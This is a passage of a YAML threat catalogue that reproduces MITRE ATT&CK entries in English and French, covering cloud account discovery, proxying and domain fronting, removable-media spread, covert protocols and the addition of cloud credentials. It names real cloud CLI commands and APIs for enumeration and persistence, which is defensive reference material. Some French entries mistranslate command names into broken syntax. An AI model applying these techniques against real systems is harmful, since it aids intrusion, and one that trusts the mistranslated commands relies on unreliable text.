          \ comptes cloud. Les comptes cloud sont ceux cr\xE9\xE9s et configur\xE9\
          s par une organisation pour \xEAtre utilis\xE9s par les utilisateurs, le\
          \ support \xE0 distance, les services, ou pour l\u2019administration de\
          \ ressources au sein d\u2019un fournisseur de services cloud ou d\u2019\
          une application SaaS.\n\nAvec un acc\xE8s authentifi\xE9, plusieurs outils\
          \ peuvent \xEAtre utilis\xE9s pour trouver des comptes. Le cmdlet <code>PowerShell\
          \ Get-MsolRoleMember</code> peut \xEAtre utilis\xE9 pour obtenir des noms\
          \ de compte attribu\xE9s \xE0 un r\xF4le ou \xE0 un groupe d\u2019autorisations\
          \ dans Office 365. (Citation : Microsoft msolrolemember)(Citation : GitHub\
          \ Raindance) Le CLI Azure (AZ CLI) fournit \xE9galement une interface pour\
          \ obtenir des comptes utilisateurs avec un acc\xE8s authentifi\xE9 \xE0\
          \ un domaine. La commande <code>az ad list d\u2019utilisateurs</code> listera\
          \ tous les utilisateurs d\u2019un domaine. (Citation : Microsoft AZ CLI)(Citation\
          \ : Black Hills Red Teaming MS AD Azure, 2018) \n\nLa commande <code>AWS\
          \ aws iam-list-users</code> peut \xEAtre utilis\xE9e pour obtenir une liste\
          \ d\u2019utilisateurs dans le compte courant tandis que <code>aws iam-roles\
          \ de liste</code> peut obtenir des r\xF4les IAM ayant un pr\xE9fixe path\
          \ sp\xE9cifi\xE9. (Citation : R\xF4les AWS List)(Citation : Utilisateurs\
          \ de la liste AWS) Dans GCP, <code>gcloud iam-accounts list</code> et <code>gcloud\
          \ projects get-iam-policy</code> peuvent \xEAtre utilis\xE9s pour obtenir\
          \ une liste des comptes de service et des utilisateurs d\u2019un projet.\
          \ (Citation : Google Cloud - API IAM Servie Accounts List)\nhttps://attack.mitre.org/techniques/T1087/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090
    ref_id: T1090
    name: Proxy
    description: 'Adversaries may use a connection proxy to direct network traffic
      between systems or act as an intermediary for network communications to a command
      and control server to avoid direct connections to their infrastructure. Many
      tools exist that enable traffic redirection through proxies or port redirection,
      including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap.
      (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies
      to manage command and control communications, reduce the number of simultaneous
      outbound network connections, provide resiliency in the face of connection loss,
      or to ride over existing trusted communications paths between victims to avoid
      suspicion. Adversaries may chain together multiple proxies to further disguise
      the source of malicious traffic.


      Adversaries can also take advantage of routing schemes in Content Delivery Networks
      (CDNs) to proxy command and control traffic.

      https://attack.mitre.org/techniques/T1090'
    translations:
      fr:
        name: Proxy
        description: "Les adversaires peuvent utiliser un proxy de connexion pour\
          \ diriger le trafic r\xE9seau entre les syst\xE8mes ou agir comme interm\xE9\
          diaire pour les communications r\xE9seau vers un serveur de commande et\
          \ de contr\xF4le afin d\u2019\xE9viter les connexions directes \xE0 leur\
          \ infrastructure. De nombreux outils existent qui permettent la redirection\
          \ du trafic via des proxys ou la redirection de ports, notamment [HTRAN](https://attack.mitre.org/software/S0040),\
          \ ZXProxy et ZXPortMap. (Citation : Outils d\u2019attaque Trend Micro APT)\
          \ Les adversaires utilisent ce type de proxies pour g\xE9rer les communications\
          \ de commandement et de contr\xF4le, r\xE9duire le nombre de connexions\
          \ r\xE9seau sortantes simultan\xE9es, assurer leur r\xE9silience face \xE0\
          \ la perte de connexion, ou pour survoler les chemins de communication fiables\
          \ existants entre les victimes afin d\u2019\xE9viter les soup\xE7ons. Les\
          \ adversaires peuvent encha\xEEner plusieurs proxys pour mieux dissimuler\
          \ la source du trafic malveillant.\n\nLes adversaires peuvent \xE9galement\
          \ profiter des sch\xE9mas de routage dans les r\xE9seaux de diffusion de\
          \ contenu (CDN) pour proxy le trafic de commande et de contr\xF4le.\nhttps://attack.mitre.org/techniques/T1090"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.001
    ref_id: T1090.001
    name: Internal Proxy
    description: 'Adversaries may use an internal proxy to direct command and control
      traffic between two or more systems in a compromised environment. Many tools
      exist that enable traffic redirection through proxies or port redirection, including
      [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation:
      Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command
      and control communications inside a compromised environment, to reduce the number
      of simultaneous outbound network connections, to provide resiliency in the face
      of connection loss, or to ride over existing trusted communications paths between
      infected systems to avoid suspicion. Internal proxy connections may use common
      peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with
      the environment.


      By using a compromised internal system as a proxy, adversaries may conceal the
      true destination of C2 traffic while reducing the need for numerous connections
      to external systems.

      https://attack.mitre.org/techniques/T1090/001'
    translations:
      fr:
        name: Proxy interne
        description: "Les adversaires peuvent utiliser un proxy interne pour diriger\
          \ le trafic de commande et de contr\xF4le entre deux syst\xE8mes ou plus\
          \ dans un environnement compromis. De nombreux outils existent qui permettent\
          \ la redirection du trafic via des proxys ou la redirection de ports, notamment\
          \ [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy et ZXPortMap.\
          \ (Citation : Outils d\u2019attaque Trend Micro APT) Les adversaires utilisent\
          \ des proxies internes pour g\xE9rer les communications de commande et de\
          \ contr\xF4le dans un environnement compromis, pour r\xE9duire le nombre\
          \ de connexions sortantes simultan\xE9es, pour assurer la r\xE9silience\
          \ face \xE0 la perte de connexion, ou pour survoler les chemins de communication\
          \ fiables existants entre syst\xE8mes infect\xE9s afin d\u2019\xE9viter\
          \ les soup\xE7ons. Les connexions proxy internes peuvent utiliser des protocoles\
          \ r\xE9seau pair-\xE0-pair (p2p) courants, tels que SMB, pour mieux s\u2019\
          int\xE9grer \xE0 l\u2019environnement.\n\nEn utilisant un syst\xE8me interne\
          \ compromis comme substitut, les adversaires peuvent dissimuler la v\xE9\
          ritable destination du trafic C2 tout en r\xE9duisant le besoin de nombreuses\
          \ connexions vers des syst\xE8mes externes.\nhttps://attack.mitre.org/techniques/T1090/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.002
    ref_id: T1090.002
    name: External Proxy
    description: 'Adversaries may use an external proxy to act as an intermediary
      for network communications to a command and control server to avoid direct connections
      to their infrastructure. Many tools exist that enable traffic redirection through
      proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040),
      ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries
      use these types of proxies to manage command and control communications, to
      provide resiliency in the face of connection loss, or to ride over existing
      trusted communications paths to avoid suspicion.


      External connection proxies are used to mask the destination of C2 traffic and
      are typically implemented with port redirectors. Compromised systems outside
      of the victim environment may be used for these purposes, as well as purchased
      infrastructure such as cloud-based resources or virtual private servers. Proxies
      may be chosen based on the low likelihood that a connection to them from a compromised
      system would be investigated. Victim systems would communicate directly with
      the external proxy on the Internet and then the proxy would forward communications
      to the C2 server.

      https://attack.mitre.org/techniques/T1090/002'
    translations:
      fr:
        name: Proxy externe
        description: "Les adversaires peuvent utiliser un proxy externe pour agir\
          \ comme interm\xE9diaire des communications r\xE9seau vers un serveur de\
          \ commandement et de contr\xF4le afin d\u2019\xE9viter les connexions directes\
          \ \xE0 leur infrastructure. De nombreux outils existent qui permettent la\
          \ redirection du trafic via des proxys ou la redirection de ports, notamment\
          \ [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy et ZXPortMap.\
          \ (Citation : Outils d\u2019attaque Trend Micro APT) Les adversaires utilisent\
          \ ce type de proxies pour g\xE9rer les communications de commandement et\
          \ de contr\xF4le, pour assurer leur r\xE9silience face \xE0 la perte de\
          \ connexion, ou pour survoler les voies de communication fiables existantes\
          \ afin d\u2019\xE9viter les soup\xE7ons.\n\nLes proxys de connexion externes\
          \ sont utilis\xE9s pour masquer la destination du trafic C2 et sont g\xE9\
          n\xE9ralement impl\xE9ment\xE9s avec des redirecteurs de port. Des syst\xE8\
          mes compromis en dehors de l\u2019environnement victime peuvent \xEAtre\
          \ utilis\xE9s \xE0 ces fins, ainsi que des infrastructures achet\xE9es telles\
          \ que des ressources cloud ou des serveurs priv\xE9s virtuels. Les proxies\
          \ peuvent \xEAtre choisis en fonction de la faible probabilit\xE9 qu\u2019\
          une connexion \xE0 eux depuis un syst\xE8me compromis soit enqu\xEAt\xE9\
          e. Les syst\xE8mes victimes communiquaient directement avec le proxy externe\
          \ sur Internet, puis le proxy transmettait les communications vers le serveur\
          \ C2.\nhttps://attack.mitre.org/techniques/T1090/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.003
    ref_id: T1090.003
    name: Multi-hop Proxy
    description: "Adversaries may chain together multiple proxies to disguise the\
      \ source of malicious traffic. Typically, a defender will be able to identify\
      \ the last proxy traffic traversed before it enters their network; the defender\
      \ may or may not be able to identify any previous proxies before the last-hop\
      \ proxy. This technique makes identifying the original source of the malicious\
      \ traffic even more difficult by requiring the defender to trace malicious traffic\
      \ through several proxies to identify its source.\n\nFor example, adversaries\
      \ may construct or use onion routing networks \u2013 such as the publicly available\
      \ [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport\
      \ encrypted C2 traffic through a compromised population, allowing communication\
      \ with any device within the network.(Citation: Onion Routing) Adversaries may\
      \ also use operational relay box (ORB) networks composed of virtual private\
      \ servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life\
      \ routers to obfuscate their operations.(Citation: ORB Mandiant) \n\nIn the\
      \ case of network infrastructure, it is possible for an adversary to leverage\
      \ multiple compromised devices to create a multi-hop proxy chain (i.e., [Network\
      \ Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch\
      \ System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries\
      \ can add custom code to the affected network devices that will implement onion\
      \ routing between those nodes. This method is dependent upon the [Network Boundary\
      \ Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries\
      \ to cross the protected network boundary of the Internet perimeter and into\
      \ the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may\
      \ be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer\
      \ (P2P) and blockchain-oriented infrastructure to implement routing between\
      \ a decentralized network of peers.(Citation: NGLite Trojan)\nhttps://attack.mitre.org/techniques/T1090/003"
    translations:
      fr:
        name: Proxy multi-sauts
        description: "Les adversaires peuvent encha\xEEner plusieurs proxys pour dissimuler\
          \ la source du trafic malveillant. Typiquement, un d\xE9fenseur sera capable\
          \ d\u2019identifier le dernier trafic proxy parcouru avant qu\u2019il n\u2019\
          entre dans son r\xE9seau ; Le d\xE9fendeur peut ou non \xEAtre capable d\u2019\
          identifier d\u2019anciens proxies avant le dernier saut. Cette technique\
          \ rend l\u2019identification de la source originale du trafic malveillant\
          \ encore plus difficile en exigeant que le d\xE9fenseur retrace le trafic\
          \ malveillant via plusieurs proxys pour en identifier la source.\n\nPar\
          \ exemple, les adversaires peuvent construire ou utiliser des r\xE9seaux\
          \ de routage onion \u2013 comme le r\xE9seau public [Tor](https://attack.mitre.org/software/S0183)\
          \ \u2013 pour transporter du trafic C2 chiffr\xE9 \xE0 travers une population\
          \ compromise, permettant la communication avec n\u2019importe quel appareil\
          \ du r\xE9seau. (Citation : Onion Routing) Les adversaires peuvent \xE9\
          galement utiliser des r\xE9seaux de bo\xEEtes relais op\xE9rationnelles\
          \ (ORB) compos\xE9s de serveurs priv\xE9s virtuels (VPS), d\u2019appareils\
          \ Internet des objets (IoT), d\u2019appareils intelligents et de routeurs\
          \ en fin de vie pour obscurcir leurs op\xE9rations. (Citation : ORB Mandiant)\
          \ \n\nDans le cas de l\u2019infrastructure r\xE9seau, il est possible pour\
          \ un adversaire de tirer parti de plusieurs appareils compromis pour cr\xE9\
          er une cha\xEEne de proxy \xE0 sauts multiples (c\u2019est-\xE0-dire [Dispositifs\
          \ r\xE9seau](https://attack.mitre.org/techniques/T1584/008)). En exploitant\
          \ [Patch System Image](https://attack.mitre.org/techniques/T1601/001) sur\
          \ les routeurs, les adversaires peuvent ajouter du code personnalis\xE9\
          \ aux dispositifs r\xE9seau concern\xE9s qui impl\xE9menteront le routage\
          \ onion entre ces n\u0153uds. Cette m\xE9thode d\xE9pend de la m\xE9thode\
          \ [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599),\
          \ permettant aux adversaires de franchir la fronti\xE8re prot\xE9g\xE9e\
          \ du p\xE9rim\xE8tre Internet et d\u2019entrer dans le r\xE9seau \xE9tendu\
          \ (WAN) de l\u2019organisation.  Des protocoles tels que l\u2019ICMP peuvent\
          \ \xEAtre utilis\xE9s comme moyen de transport.  \n\nDe m\xEAme, les adversaires\
          \ peuvent abuser des infrastructures peer-to-peer (P2P) et orient\xE9es\
          \ blockchain pour mettre en place le routage entre un r\xE9seau d\xE9centralis\xE9\
          \ de pairs. (Citation : nglite Trojan)\nhttps://attack.mitre.org/techniques/T1090/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.004
    ref_id: T1090.004
    name: Domain Fronting
    description: 'Adversaries may take advantage of routing schemes in Content Delivery
      Networks (CDNs) and other services which host multiple domains to obfuscate
      the intended destination of HTTPS traffic or traffic tunneled through HTTPS.
      (Citation: Fifield Blocking Resistent Communication through domain fronting
      2015) Domain fronting involves using different domain names in the SNI field
      of the TLS header and the Host field of the HTTP header. If both domains are
      served from the same CDN, then the CDN may route to the address specified in
      the HTTP header after unwrapping the TLS header. A variation of the the technique,
      "domainless" fronting, utilizes a SNI field that is left blank; this may allow
      the fronting to work even when the CDN attempts to validate that the SNI and
      HTTP Host fields match (if the blank SNI fields are ignored).


      For example, if domain-x and domain-y are customers of the same CDN, it is possible
      to place domain-x in the TLS header and domain-y in the HTTP header. Traffic
      will appear to be going to domain-x, however the CDN may route it to domain-y.

      https://attack.mitre.org/techniques/T1090/004'
    translations:
      fr:
        name: Fronting de domaine
        description: "Les adversaires peuvent profiter des sch\xE9mas de routage dans\
          \ les r\xE9seaux de diffusion de contenu (CDN) et autres services h\xE9\
          bergeant plusieurs domaines pour obscurcir la destination pr\xE9vue du trafic\
          \ HTTPS ou du trafic tunnel\xE9 via HTTPS. (Citation : Fifield bloquant\
          \ la communication r\xE9sistante via le front de domaine 2015) Le fronting\
          \ de domaine consiste \xE0 utiliser diff\xE9rents noms de domaine dans le\
          \ champ SNI de l\u2019en-t\xEAte TLS et le champ Host de l\u2019en-t\xEA\
          te HTTP. Si les deux domaines sont servis depuis le m\xEAme CDN, alors le\
          \ CDN peut router vers l\u2019adresse sp\xE9cifi\xE9e dans l\u2019en-t\xEA\
          te HTTP apr\xE8s avoir d\xE9pli\xE9 l\u2019en-t\xEAte TLS. Une variante\
          \ de la technique, le fronting \xAB sans domaine \xBB, utilise un champ\
          \ SNI laiss\xE9 vide ; cela peut permettre au fronting de fonctionner m\xEA\
          me lorsque le CDN tente de valider que les champs SNI et HTTP Host correspondent\
          \ (si les champs SNI vides sont ignor\xE9s).\n\nPar exemple, si domain-x\
          \ et domain-y sont des clients du m\xEAme CDN, il est possible de placer\
          \ domain-x dans l\u2019en-t\xEAte TLS et domain-y dans l\u2019en-t\xEAte\
          \ HTTP. Le trafic semblera aller vers domain-x, cependant le CDN peut le\
          \ router vers domain-y.\nhttps://attack.mitre.org/techniques/T1090/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1091
    ref_id: T1091
    name: Replication Through Removable Media
    description: 'Adversaries may move onto systems, possibly those on disconnected
      or air-gapped networks, by copying malware to removable media and taking advantage
      of Autorun features when the media is inserted into a system and executes. In
      the case of Lateral Movement, this may occur through modification of executable
      files stored on removable media or by copying malware and renaming it to look
      like a legitimate file to trick users into executing it on a separate system.
      In the case of Initial Access, this may occur through manual manipulation of
      the media, modification of systems used to initially format the media, or modification
      to the media''s firmware itself.


      Mobile devices may also be used to infect PCs with malware if connected via
      USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using
      devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation:
      Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For
      example, when a smartphone is connected to a system, it may appear to be mounted
      similar to a USB-connected disk drive. If malware that is compatible with the
      connected system is on the mobile device, the malware could infect the machine
      (especially if Autorun features are enabled).

      https://attack.mitre.org/techniques/T1091'
    translations:
      fr:
        name: "R\xE9plication par supports amovibles"
        description: "Les adversaires peuvent passer \xE0 des syst\xE8mes, \xE9ventuellement\
          \ sur des r\xE9seaux d\xE9connect\xE9s ou issus de r\xE9seaux s\xE9par\xE9\
          s, en copiant des logiciels malveillants sur des supports amovibles et en\
          \ profitant des fonctionnalit\xE9s Autorun lorsque le support est ins\xE9\
          r\xE9 dans un syst\xE8me et s\u2019ex\xE9cute. Dans le cas du mouvement\
          \ lat\xE9ral, cela peut se produire par la modification de fichiers ex\xE9\
          cutables stock\xE9s sur un support amovible ou par la copie d\u2019un logiciel\
          \ malveillant et le renommant pour qu\u2019il ressemble \xE0 un fichier\
          \ l\xE9gitime afin de tromper les utilisateurs et les faire ex\xE9cuter\
          \ sur un syst\xE8me s\xE9par\xE9. Dans le cas de l\u2019Acc\xE8s Initial,\
          \ cela peut se faire par manipulation manuelle du support, modification\
          \ des syst\xE8mes utilis\xE9s pour formater initialement le support, ou\
          \ modification du firmware lui-m\xEAme.\n\nLes appareils mobiles peuvent\
          \ \xE9galement \xEAtre utilis\xE9s pour infecter des PC avec des logiciels\
          \ malveillants s\u2019ils sont connect\xE9s via USB. (Citation : Exploitation\
          \ de la cl\xE9 USB d\u2019un smartphone) Cette infection peut \xEAtre d\xE9\
          tect\xE9e via des appareils (Android, iOS, etc.) et, dans certains cas,\
          \ des c\xE2bles de charge USB. (Citation : Malware Windows infectant Android)(Citation\
          \ : Hack du c\xE2ble de recharge de l\u2019iPhone) Par exemple, lorsqu\u2019\
          un smartphone est connect\xE9 \xE0 un syst\xE8me, il peut sembler mont\xE9\
          \ de mani\xE8re similaire \xE0 un disque dur connect\xE9 \xE0 une cl\xE9\
          \ USB. Si un malware compatible avec le syst\xE8me connect\xE9 est pr\xE9\
          sent sur l\u2019appareil mobile, il pourrait infecter la machine (surtout\
          \ si les fonctions Autorun sont activ\xE9es).\nhttps://attack.mitre.org/techniques/T1091"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1092
    ref_id: T1092
    name: Communication Through Removable Media
    description: 'Adversaries can perform command and control between compromised
      hosts on potentially disconnected networks using removable media to transfer
      commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both
      systems would need to be compromised, with the likelihood that an Internet-connected
      system was compromised first and the second through lateral movement by [Replication
      Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands
      and files would be relayed from the disconnected system to the Internet-connected
      system to which the adversary has direct access.

      https://attack.mitre.org/techniques/T1092'
    translations:
      fr:
        name: Communication par supports amovibles
        description: "Les adversaires peuvent effectuer des commandes et du contr\xF4\
          le entre h\xF4tes compromis sur des r\xE9seaux potentiellement d\xE9connect\xE9\
          s en utilisant des supports amovibles pour transf\xE9rer des commandes d\u2019\
          un syst\xE8me \xE0 l\u2019autre. (Citation : ESET Sednit USBStealer 2014)\
          \ Les deux syst\xE8mes devraient \xEAtre compromis, avec la probabilit\xE9\
          \ qu\u2019un syst\xE8me connect\xE9 \xE0 Internet soit compromis en premier\
          \ et le second par d\xE9placement lat\xE9ral par [R\xE9plication par m\xE9\
          dia amovible](https://attack.mitre.org/techniques/T1091). Les commandes\
          \ et fichiers seraient relay\xE9s du syst\xE8me d\xE9connect\xE9 vers le\
          \ syst\xE8me connect\xE9 \xE0 Internet auquel l\u2019adversaire a un acc\xE8\
          s direct.\nhttps://attack.mitre.org/techniques/T1092"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1095
    ref_id: T1095
    name: Non-Application Layer Protocol
    description: "Adversaries may use an OSI non-application layer protocol for communication\
      \ between host and C2 server or among infected hosts within a network. The list\
      \ of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples\
      \ include use of network layer protocols, such as the Internet Control Message\
      \ Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol\
      \ (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as\
      \ redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication\
      \ between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because\
      \ ICMP is part of the Internet Protocol Suite, it is required to be implemented\
      \ by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as\
      \ commonly monitored as other Internet Protocols such as TCP or UDP and may\
      \ be used by adversaries to hide communications.\n\nIn ESXi environments, adversaries\
      \ may leverage the Virtual Machine Communication Interface (VMCI) for communication\
      \ between guest virtual machines and the ESXi host. This traffic is similar\
      \ to client-server communications on traditional network sockets but is localized\
      \ to the physical machine running the ESXi host, meaning it does not traverse\
      \ external networks (routers, switches). This results in communications that\
      \ are invisible to external monitoring and standard networking tools like tcpdump,\
      \ netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi\
      \ host, adversaries may persistently regain access from any guest VM to the\
      \ compromised ESXi host\u2019s backdoor, regardless of network segmentation\
      \ or firewall rules in place.(Citation: Google Cloud Threat Intelligence VMWare\
      \ ESXi Zero-Day 2023)\nhttps://attack.mitre.org/techniques/T1095"
    translations:
      fr:
        name: Protocole non-application
        description: "Les adversaires peuvent utiliser un protocole OSI non de couche\
          \ application pour la communication entre l\u2019h\xF4te et le serveur C2\
          \ ou entre h\xF4tes infect\xE9s au sein d\u2019un r\xE9seau. La liste des\
          \ protocoles possibles est \xE9tendue. (Citation : Wikip\xE9dia OSI) Des\
          \ exemples sp\xE9cifiques incluent l\u2019utilisation de protocoles de couche\
          \ r\xE9seau, tels que l\u2019Internet Control Message Protocol (ICMP), des\
          \ protocoles de couche transport, tels que le User Datagram Protocol (UDP),\
          \ des protocoles de couche session, tels que Socket Secure (SOCKS), ainsi\
          \ que des protocoles redirig\xE9s/tunnelis\xE9s, tels que Serial over LAN\
          \ (SOL).\n\nLa communication ICMP entre h\xF4tes en est un exemple. (Citation\
          \ : Cisco Synful Knock Evolution) Parce que l\u2019ICMP fait partie de la\
          \ suite de protocoles Internet, il doit \xEAtre impl\xE9ment\xE9 par tous\
          \ les h\xF4tes compatibles IP. (Citation : Microsoft ICMP) Cependant, il\
          \ n\u2019est pas aussi fr\xE9quemment surveill\xE9 que d\u2019autres protocoles\
          \ Internet tels que TCP ou UDP et peut \xEAtre utilis\xE9 par des adversaires\
          \ pour dissimuler les communications.\n\nDans les environnements ESXi, les\
          \ adversaires peuvent utiliser l\u2019Interface de Communication de Machine\
          \ Virtuelle (VMCI) pour communiquer entre les machines virtuelles invit\xE9\
          es et l\u2019h\xF4te ESXi. Ce trafic est similaire aux communications client-serveur\
          \ sur les sockets r\xE9seau traditionnels, mais est localis\xE9 sur la machine\
          \ physique ex\xE9cutant l\u2019h\xF4te ESXi, ce qui signifie qu\u2019il\
          \ ne traverse pas les r\xE9seaux externes (routeurs, commutateurs). Cela\
          \ entra\xEEne des communications invisibles pour la surveillance externe\
          \ et les outils r\xE9seau standards tels que tcpdump, netstat, nmap et Wireshark.\
          \ En ajoutant une porte d\xE9rob\xE9e VMCI \xE0 un h\xF4te ESXi compromis,\
          \ les adversaires peuvent de mani\xE8re persistante r\xE9cup\xE9rer l\u2019\
          acc\xE8s de n\u2019importe quelle VM invit\xE9e \xE0 la porte d\xE9rob\xE9\
          e de l\u2019h\xF4te ESXi compromis, ind\xE9pendamment de la segmentation\
          \ r\xE9seau ou des r\xE8gles de pare-feu en place. (Citation : Google Cloud\
          \ Threat Intelligence VMWare ESXi Zero-Day 2023)\nhttps://attack.mitre.org/techniques/T1095"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098
    ref_id: T1098
    name: Account Manipulation
    description: "Adversaries may manipulate accounts to maintain and/or elevate access\
      \ to victim systems. Account manipulation may consist of any action that preserves\
      \ or modifies adversary access to a compromised account, such as modifying credentials\
      \ or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions\
      \ could also include account activity designed to subvert security policies,\
      \ such as performing iterative password updates to bypass password duration\
      \ policies and preserve the life of compromised credentials. \n\nIn order to\
      \ create or manipulate accounts, the adversary must already have sufficient\
      \ permissions on systems or the domain. However, account manipulation may also\
      \ lead to privilege escalation where modifications grant access to additional\
      \ roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\
      https://attack.mitre.org/techniques/T1098"
    translations:
      fr:
        name: Manipulation de compte
        description: "Les adversaires peuvent manipuler les comptes pour maintenir\
          \ et/ou am\xE9liorer l\u2019acc\xE8s aux syst\xE8mes des victimes. La manipulation\
          \ de compte peut consister en toute action qui pr\xE9serve ou modifie l\u2019\
          acc\xE8s adversaire \xE0 un compte compromis, comme modifier des identifiants\
          \ ou des groupes de permissions. (Citation : FireEye SMOKEDHAM, juin 2021)\
          \ Ces actions pourraient \xE9galement inclure des activit\xE9s de compte\
          \ con\xE7ues pour contourner les politiques de s\xE9curit\xE9, comme effectuer\
          \ des mises \xE0 jour it\xE9ratives des mots de passe pour contourner les\
          \ politiques de dur\xE9e du mot de passe et pr\xE9server la dur\xE9e de\
          \ vie des identifiants compromis. \n\nPour cr\xE9er ou manipuler des comptes,\
          \ l\u2019adversaire doit d\xE9j\xE0 disposer d\u2019autorisations suffisantes\
          \ sur les syst\xE8mes ou le domaine. Cependant, la manipulation des comptes\
          \ peut \xE9galement entra\xEEner une escalade de privil\xE8ges lorsque des\
          \ modifications accordent l\u2019acc\xE8s \xE0 des r\xF4les suppl\xE9mentaires,\
          \ des permissions ou des [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ \xE0 plus haut privil\xE8ge.\nhttps://attack.mitre.org/techniques/T1098"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.001
    ref_id: T1098.001
    name: Additional Cloud Credentials
    description: "Adversaries may add adversary-controlled credentials to a cloud\
      \ account to maintain persistent access to victim accounts and instances within\
      \ the environment.\n\nFor example, adversaries may add credentials for Service\
      \ Principals and Applications in addition to existing legitimate credentials\
      \ in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation:\
      \ Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials\
      \ include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer\
      \ Guidance) With sufficient permissions, there are a variety of ways to add\
      \ credentials including the Azure Portal, Azure command line interface, and\
      \ Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\
      \nIn infrastructure-as-a-service (IaaS) environments, after gaining access through\
      \ [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries\
      \ may generate or import their own SSH keys using either the <code>CreateKeyPair</code>\
      \ or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login\
      \ ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows\
      \ persistent access to instances within the cloud environment without further\
      \ usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation:\
      \ Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code>\
      \ API in AWS or the <code>gcloud iam service-accounts keys create</code> command\
      \ in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code>\
      \ API in AWS to add a password that can be used to log into the AWS Management\
      \ Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation:\
      \ Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024)\
      \ If the target account has different permissions from the requesting account,\
      \ the adversary may also be able to escalate their privileges in the environment\
      \ (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel\
      \ 2.0) For example, in Entra ID environments, an adversary with the Application\
      \ Administrator role can add a new set of credentials to their application's\
      \ service principal. In doing so the adversary would be able to access the service\
      \ principal\u2019s roles and permissions, which may be different from those\
      \ of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation)\
      \ \n\nIn AWS environments, adversaries with the appropriate permissions may\
      \ also use the `sts:GetFederationToken` API call to create a temporary set of\
      \ credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606)\
      \ tied to the permissions of the original user account. These temporary credentials\
      \ may remain valid for the duration of their lifetime even if the original account\u2019\
      s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation\
      \ Persistence)\n\nIn Entra ID environments with the app password feature enabled,\
      \ adversaries may be able to add an app password to a user account.(Citation:\
      \ Mandiant APT42 Operations 2024) As app passwords are intended to be used with\
      \ legacy devices that do not support multi-factor authentication (MFA), adding\
      \ an app password can allow an adversary to bypass MFA requirements. Additionally,\
      \ app passwords may remain valid even if the user\u2019s primary password is\
      \ reset.(Citation: Microsoft Entra ID App Passwords)\nhttps://attack.mitre.org/techniques/T1098/001"
    translations:
      fr:
        name: "Identifiants Cloud suppl\xE9mentaires"
        description: "Les attaquants peuvent ajouter des identifiants qu\u2019ils\
          \ contr\xF4lent \xE0 un compte cloud afin de conserver un acc\xE8s permanent\
          \ aux comptes et aux instances des victimes au sein de l\u2019environnement.\n\
          \nPar exemple, les attaquants peuvent ajouter des identifiants pour des\
          \ entit\xE9s de service et des applications en plus des identifiants l\xE9\
          gitimes existants dans Azure / Entra ID. (R\xE9f\xE9rence : Guide Microsoft\
          \ destin\xE9 aux clients SolarWinds) (R\xE9f\xE9rence : Blue Cloud of Death)\
          \ (R\xE9f\xE9rence : Vid\xE9o Blue Cloud of Death) Ces identifiants comprennent\
          \ \xE0 la fois des cl\xE9s x509 et des mots de passe. (R\xE9f\xE9rence :\
          \ Conseils de Microsoft aux clients SolarWinds) Avec des autorisations suffisantes,\
          \ il existe plusieurs fa\xE7ons d\u2019ajouter des identifiants, notamment\
          \ via le portail Azure, l\u2019interface de ligne de commande Azure et les\
          \ modules Azure ou Az PowerShell. (R\xE9f\xE9rence : D\xE9mystifier les\
